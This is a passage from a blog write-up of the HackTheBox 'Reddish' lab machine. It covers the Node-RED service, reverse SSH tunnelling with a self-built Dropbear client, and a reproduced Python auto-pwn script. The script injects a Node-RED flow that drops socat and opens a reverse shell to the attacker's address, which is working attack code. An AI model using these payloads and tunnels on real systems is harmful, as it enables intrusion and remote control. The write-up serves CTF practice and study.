// Serve the http nodes UI from /api</span><br><span class="line">    app.use(settings.httpNodeRoot, RED.httpNode);</span><br><span class="line"></span><br><span class="line">    RED.start();</span><br><span class="line"></span><br><span class="line">    id_list.push(<span class="built_in">id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Create an Express app</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">// Add a simple route <span class="keyword">for</span> static content served from <span class="string">&#x27;public&#x27;</span></span><br><span class="line">app.use(<span class="string">&quot;/&quot;</span>,express.static(<span class="string">&quot;public&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(req,res) &#123;</span><br><span class="line">    var ip = (req.headers[<span class="string">&#x27;x-forwarded-for&#x27;</span>] ||</span><br><span class="line">     req.connection.remoteAddress ||</span><br><span class="line">     req.socket.remoteAddress ||</span><br><span class="line">     req.connection.socket.remoteAddress).<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>)[0];</span><br><span class="line"></span><br><span class="line">    var <span class="built_in">id</span> = createNodeREDInstance(server, app, ip);</span><br><span class="line">    res.status(200).send(&#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">id</span>, <span class="string">&quot;ip&quot;</span>: ip, <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Create a server</span><br><span class="line">var server = http.createServer(app);</span><br><span class="line"></span><br><span class="line">server.listen(1880);</span><br></pre></td></tr></table></figure>

<p>There’s no GET for this app, which explains the error. A POST will create a new NodeRed instance and return the id, and the id is what’s sent back to us.</p>
<p>Inside the createNodeREDInstance() function I see the id is just a hash of our ip (which works out really nice when multiple HTB players are trying to use this at the same time):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var <span class="built_in">id</span> = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Creating-Port-Forwards-with-Dropbear"><a href="#Creating-Port-Forwards-with-Dropbear" class="headerlink" title="Creating Port Forwards with Dropbear"></a>Creating Port Forwards with Dropbear</h2><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>a dummy account on my kali box (named dummy). In &#x2F;etc&#x2F;passwd, the shell is set to &#x2F;bin&#x2F;false:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dummy:x:1001:1001::/home/dummy:/bin/false</span><br></pre></td></tr></table></figure>

<p>That makes it much harder for someone who gets ahold of the key I’m about to create to do anything useful hacking into my host. If you try to ssh into box as dummy, it just closes:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh dummy@localhost</span></span><br><span class="line">dummy@localhost<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux kali 4.18.0-kali3-amd64 #1 SMP Debian 4.18.20-2kali2 (2018-11-30) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Kali GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Jan 17 06:28:18 2019 from 127.0.0.1</span></span><br><span class="line"><span class="string">Connection to localhost closed.</span></span><br></pre></td></tr></table></figure>

<p>use the -N flag to connect without a shell, and the -L, -R, -D flags to forward ports (check out <span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE4LzA2LzEwL2ludHJvLXRvLXNzaC10dW5uZWxpbmcuaHRtbA==">Intro to SSH Tunneling<i class="fa fa-external-link-alt"></i></span> for more details).</p>
<h3 id="Build-Dropbear"><a href="#Build-Dropbear" class="headerlink" title="Build Dropbear"></a>Build Dropbear</h3><p><span class="exturl" data-url="aHR0cHM6Ly9tYXR0LnVjYy5hc24uYXUvZHJvcGJlYXIvZHJvcGJlYXIuaHRtbA==">Dropbear<i class="fa fa-external-link-alt"></i></span> is a statically compiled, relatively small ssh client that I will use to connect back to my kali box from nodered. I’ll grab the source from the website. I’ll copy the file to nodered using the file upload flow or the perl command to get a file over http:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://10.10.14.9/dropbear-2018.76.tar.bz2&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">dropbear-2018.76.tar.bz2</span><br></pre></td></tr></table></figure>

<p>Open the archive with tar:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tar xjvf dropbear-2018.76.tar.bz2                                                      </span></span><br><span class="line">dropbear-2018.76/                                                                        </span><br><span class="line">dropbear-2018.76/termcodes.h                                                  </span><br><span class="line">dropbear-2018.76/dbmulti.c                                                                </span><br><span class="line">dropbear-2018.76/cli-runopts.c  </span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>Now compile the software (the container has gcc and the minimum libraries to build this):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd dropbear-2018.76/                     </span></span><br><span class="line"><span class="comment"># ./configure &amp;&amp; make                  </span></span><br><span class="line">checking <span class="keyword">for</span> gcc... gcc                      </span><br><span class="line">checking whether the C compiler works... <span class="built_in">yes</span></span><br><span class="line">checking <span class="keyword">for</span> C compiler default output file name... a.out</span><br><span class="line">checking <span class="keyword">for</span> suffix of executables...    </span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<h3 id="Generate-Key-Pair"><a href="#Generate-Key-Pair" class="headerlink" title="Generate Key Pair"></a>Generate Key Pair</h3><p>Next generate a key pair to use with dropbearkey. It’s a simple program with <span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi84L2Ryb3BiZWFya2V5">only a few options<i class="fa fa-external-link-alt"></i></span>. use -t rsa to make an RSA keypair, and -f .k to name the key file .k:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./dropbearkey -t rsa -f .k</span></span><br><span class="line">Generating 2048 bit rsa key, this may take a <span class="keyword">while</span>...</span><br><span class="line">Public key portion is:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCFI9K2O4PVLSLLIJw2ExqYHtPUQTrcn+GKR3BRaD8Th+5CYIPMRQF8MK29tlgjdZh5MSf5RB4tsm523hMp6879tvi0Bzc0afZ8FKfaVjTwWsG/cbNFZzi4W5PpwsLkh9vbBgXhbPfdmMdz2uLZrsmPKVKXXkg/URz9vhiQelJAL0PcysIBh3c9CkJfNzzNJ2DHxY/OugnhQlObmLfOzkucP2DtTAZjYYCpc8cByzKS7vgo8rZLscf7QrN3LLKr8SFmjSnEcqxvIC1cVOpRju3kmfJxNY4ebcod1DaQtRYXC+K2byNwf5y3z3ahhW8dWJVLEcPH0bueuRVnYk3wfrjx root@nodered</span><br><span class="line">Fingerprint: sha1!! 78:53:6e:77:d8:da:ef:43:a7:c8:97:de:3c:a0:c4:d4:80:7d:f3:ab</span><br></pre></td></tr></table></figure>

<p>Now put this public key into the authorized key file for dummy on my kali box. While this key is in that file, anyone who has the private key (.k) can ssh into my box, so I’ll want to leave this in place only long enough to get the tunnels set up.</p>
<h3 id="Create-Tunnel"><a href="#Create-Tunnel" class="headerlink" title="Create Tunnel"></a>Create Tunnel</h3><p>Now use DropBear’s dbclient to ssh back, creating a tunnel to access the web page on www:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.9</span></span><br></pre></td></tr></table></figure>

<p>The options used are:</p>
<ul>
<li>-i .k - Use the keyfile I generated earlier</li>
<li>-f - run ssh in the background</li>
<li>-N - Done request a shell or run and commands</li>
<li>-R 8888:172.19.0.4:80 - listen on port 8888 on my kali host, and forward and traffic to 172.19.0.4 port 80. It’s important to note that my dummy user doesn’t have the privilege necessary to listen on a low port, like 80.</li>
</ul>
<p>Now can access the website on www:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb58.jpg"></li>
</ul>
<h2 id="python-auto-pwn-script"><a href="#python-auto-pwn-script" class="headerlink" title="python auto-pwn script"></a>python auto-pwn script</h2><p>reference to <span class="exturl" data-url="aHR0cHM6Ly9hbGFtb3QuZ2l0aHViLmlvL3JlZGRpc2hfd3JpdGV1cC8=">this writeup link<i class="fa fa-external-link-alt"></i></span></p>
<p>awesome write up and python script, i Worship the author…</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsYW1vdC9jb2RlLXNuaXBwZXRzL2Jsb2IvbWFzdGVyL2hhY2tpbmcvSFRCL1JlZGRpc2gvYXV0b3B3bl9yZWRkaXNoLnB5">script in his github<i class="fa fa-external-link-alt"></i></span></p>
<p>autopwnreddish.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import uuid</span><br><span class="line">import fcntl</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">import urllib</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_ip_address(ifname):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="built_in">return</span> socket.inet_ntoa(fcntl.ioctl(</span><br><span class="line">        s.fileno(),</span><br><span class="line">        0x8915,  <span class="comment"># SIOCGIFADDR</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;256s&#x27;</span>, ifname[:15].encode())</span><br><span class="line">    )[20:24])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">LHOST = get_ip_address(<span class="string">&#x27;tun0&#x27;</span>)</span><br><span class="line">LPORT1 = <span class="string">&quot;60000&quot;</span></span><br><span class="line">LPORT2 = str(random.randint(60003, 62535))</span><br><span class="line">LPORT3 = str(random.randint(62535, 65535))</span><br><span class="line">LPORT4 = <span class="string">&quot;60001&quot;</span></span><br><span class="line">UUIDNAME = str(uuid.uuid4())[:8]</span><br><span class="line">SOCAT_SRCPATH = <span class="string">&quot;socat&quot;</span></span><br><span class="line">SOCAT_DSTPATH = <span class="string">&quot;/var/tmp/socat&quot;</span> + UUIDNAME</span><br><span class="line">SUBASH_PATH = <span class="string">&quot;/var/tmp/&quot;</span> + UUIDNAME</span><br><span class="line">CRONPL_PATH = <span class="string">&quot;/tmp/&quot;</span> + UUIDNAME</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_payloads():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Get id</span></span><br><span class="line">    p1 = log.progress(<span class="string">&quot;Getting our id&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en&quot;</span>,<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p1.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            uid = json_data = json.loads(response.text)[<span class="string">&quot;id&quot;</span>].strip()</span><br><span class="line">            p1.success(<span class="string">&quot;OK (id = &quot;</span> + uid + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p1.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Load flows</span></span><br><span class="line">    p2 = log.progress(<span class="string">&quot;Loading node-red flows&quot;</span>)</span><br><span class="line">    with open(SOCAT_SRCPATH, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">        b64upload = base64.b64encode(f.read())</span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;flows\&quot;:[&#123;\&quot;id\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;type\&quot;:\&quot;tab\&quot;,\&quot;label\&quot;:\&quot;Flow 1\&quot;&#125;,&#123;\&quot;id\&quot;:\&quot;6c08c84b.d9c578\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;node -e &#x27;(function()&#123; var  cp = require(\\\&quot;child_process\\\&quot;), sh = cp.spawn(\\\&quot;/bin/sh\\\&quot;, [\\\&quot;-c\\\&quot;, \\\&quot;cat &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot;.b64 | base64 -d &gt; &quot;</span> +SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; chmod +x &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; exec:/bin/bash,pty,rawer,echo=0,stderr,setsid,sigint tcp:&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + LPORT1 + <span class="string">&quot;\\\&quot;]); return /a/; &#125;)();&#x27;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:151,\&quot;y\&quot;:88,\&quot;wires\&quot;:[[\&quot;d27da06a.44a1a\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;d27da06a.44a1a\&quot;,\&quot;type\&quot;:\&quot;exec\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;command\&quot;:\&quot;\&quot;,\&quot;addpay\&quot;:true,\&quot;append\&quot;:\&quot;\&quot;,\&quot;useSpawn\&quot;:\&quot;false\&quot;,\&quot;timer\&quot;:\&quot;\&quot;,\&quot;oldrc\&quot;:false,\&quot;name\&quot;:\&quot;\&quot;,\&quot;x\&quot;:310,\&quot;y\&quot;:80,\&quot;wires\&quot;:[[],[],[]]&#125;,&#123;\&quot;id\&quot;:\&quot;fae51292.d8e68\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;&quot;</span> + b64upload +<span class="string">&quot;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:113,\&quot;y\&quot;:260,\&quot;wires\&quot;:[[\&quot;7e1e7cb5.664234\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;7e1e7cb5.664234\&quot;,\&quot;type\&quot;:\&quot;file\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;filename\&quot;:\&quot;&quot;</span> + SOCAT_DSTPATH +<span class="string">&quot;.b64\&quot;,\&quot;appendNewline\&quot;:false,\&quot;createDir\&quot;:false,\&quot;overwriteFile\&quot;:\&quot;true\&quot;,\&quot;x\&quot;:320,\&quot;y\&quot;:260,\&quot;wires\&quot;:[]&#125;]&#125;&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json; charset=utf-8&quot;</span>,<span class="string">&quot;Node-RED-Deployment-Type&quot;</span>:<span class="string">&quot;full&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>, data=rawBody, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p2.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p2.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p2.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject base64-encoded socat</span></span><br><span class="line">    p3 = log.progress(<span class="string">&quot;Injecting base64-encoded socat&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p3.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p3.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p3.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject nodejs reverse shell</span></span><br><span class="line">    p4 = log.progress(<span class="string">&quot;Injecting socat reverse shell via nodejs [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + str(LPORT1) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p4.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p4.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p4.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;What shell do you want?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1] root@nodered&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2] www-data@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3] root@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[4] root@backup&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[5] root@reddish&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[6] Exit&quot;</span>)</span><br><span class="line">response = None</span><br><span class="line"><span class="keyword">while</span> response not <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>]:</span><br><span class="line">    response = raw_input(<span class="string">&quot;Please enter a number 1-6: &quot;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;6&quot;</span>:</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    threading.Thread(target=send_payloads).start()</span><br><span class="line">except Exception as e:</span><br><span class="line">    log.error(str(e))</span><br><span class="line">socat = listen(LPORT1, bindaddr=LHOST, <span class="built_in">timeout</span>=20).wait_for_connection()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span 